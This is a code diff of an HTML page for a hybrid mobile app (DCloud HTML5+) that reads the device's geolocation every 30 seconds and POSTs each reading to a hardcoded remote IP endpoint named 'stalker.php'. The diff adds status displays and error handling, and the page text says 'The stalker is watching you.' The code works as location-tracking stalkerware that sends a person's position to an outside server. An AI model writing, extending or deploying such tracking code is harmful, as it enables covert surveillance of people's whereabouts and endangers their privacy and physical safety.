@@ -1,66 +1,114 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-	<script src="js/jquery-3.6.1.min.js"></script>
-    <title></title>
-    <script type="text/javascript">
-		function pushToCloud(json) {
-			var domain = 'http://101.101.209.230';
-			var url = domain + "/zhao/stalker.php";
-			$.ajax({
-				type: "POST",
-				url: url,
-				contentType: "application/json; charset=utf-8",
-				data: json,
-				dataType: "json",
-				success: function (data) {
-					console.log(data);
-					console.log(data.error_code);
-					console.log(data.error_msg);
-					console.log("success:", data);
-				},
-				error: function (err) {
-					console.log("error:", err);
-				}
-			})
-		}
-		
-    	function getLocation() {
-			console.log("getting location");
-			// getCurrentPosition api needs nearly 22 seconds to finish, sometimes.
-    		plus.geolocation.getCurrentPosition(function(data){
-    			json = JSON.stringify(data);
-				console.log(json);
-				pushToCloud(json);
-    		});
-    	}
-		
-   		document.addEventListener('plusready', function(){
-   			//console.log("所有plus api都应该在此事件发生后调用，否则会出现plus is undefined。")
-			console.log("ready");
-			interval = 30;
-			setInterval(getLocation,  interval * 1000);
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+		<script src="js/jquery-3.6.1.min.js"></script>
+		<title></title>
+		<script type="text/javascript">
+			function pushToCloud(json) {
+				var domain = 'http://101.101.209.230';
+				var url = domain + "/zhao/stalker.php";
+				$.ajax({
+					type: "POST",
+					url: url,
+					contentType: "application/json; charset=utf-8",
+					data: json,
+					dataType: "json",
+					success: function(data) {
+						console.log(data);
+						console.log(data.error_code);
+						console.log(data.error_msg);
+						console.log("api success:", data);
+						setCurrentTime();
+						$("#result_span").html("api success");
+						$("#error_span").html(data.error_msg);
+					},
+					error: function(err) {
+						console.log("api error:", err);
+						setCurrentTime();
+						$("#result_span").html("api error");
+						$("#error_span").html(err);
+					}
+				})
+			}
 
-   		});
-   		
+			function getLocation() {
+				console.log("getting location");
+				setCurrentTime();
+				$("#result_span").html("getting location");
+				$("#error_span").html("");
+				// getCurrentPosition api needs nearly 22 seconds to finish, sometimes.
+				plus.geolocation.getCurrentPosition(function(data) {
+					json = JSON.stringify(data);
+					console.log(json);
+					setCurrentTime();
+					$("#result_span").html(json);
+					$("#error_span").html("");
+					pushToCloud(json);
+				}, function(e) {
+					var msg = 'Gelocation Error. code:' + e.code + '; message:' + e.message + ";";
+					switch (e.code) {
+						case e.PERMISSION_DENIED:
+							msg += ('User denied the request for Geolocation.');
+							break;
+						case e.POSITION_UNAVAILABLE:
+							msg += ('Location information is unavailable.');
+							break;
+						case e.TIMEOUT:
+							msg += ('The request to get user location timed out.');
+							break;
+						case e.UNKNOWN_ERROR:
+							msg += ('An unknown error occurred.');
+							break;
+						default:
+							msg += "unknown error";
+							break;
+					}
+					console.log(msg);
+					setCurrentTime();
+					$("#result_span_error").html(msg);
+				});
+			}
+
+			document.addEventListener('plusready', function() {
+				//console.log("所有plus api都应该在此事件发生后调用，否则会出现plus is undefined。")
+				console.log("ready");
+				setCurrentTime();
+				getLocation();
+				interval = 30;
+				setInterval(getLocation, interval * 1000);
+
+			});
 
 
-		// 打开新Webview窗口  
-		function openNewWebview(){  
-		  // var wv = plus.webview.create('http://www.dcloud.io/');  
-		  // wv.show();  
-		  console.log("clicked");
-		  // xxx();
-		}
 
-    </script>
-</head>
-<body>
-	<!--
+			// 打开新Webview窗口  
+			function openNewWebview() {
+				// var wv = plus.webview.create('http://www.dcloud.io/');  
+				// wv.show();  
+				console.log("clicked");
+				// xxx();
+			}
+			
+			function setCurrentTime() {
+				$("#time_span").html((new Date()).toLocaleString());
+			}
+		</script>
+	</head>
+	<body>
+		<!--
 	<button onclick="openNewWebview();">open it</button>
 	-->
-	<a onclick="openNewWebview();">The stalker is watching you.</a>
-</body>
+		<a onclick="openNewWebview();">The stalker is watching you.</a>
+		<div>
+			<span id="result_span"></span>
+		</div>
+		<div>
+			<span id="error_span"></span>
+		</div>
+		<div>
+			<span id="time_span"></span>
+		</div>
+	</body>
 </html>
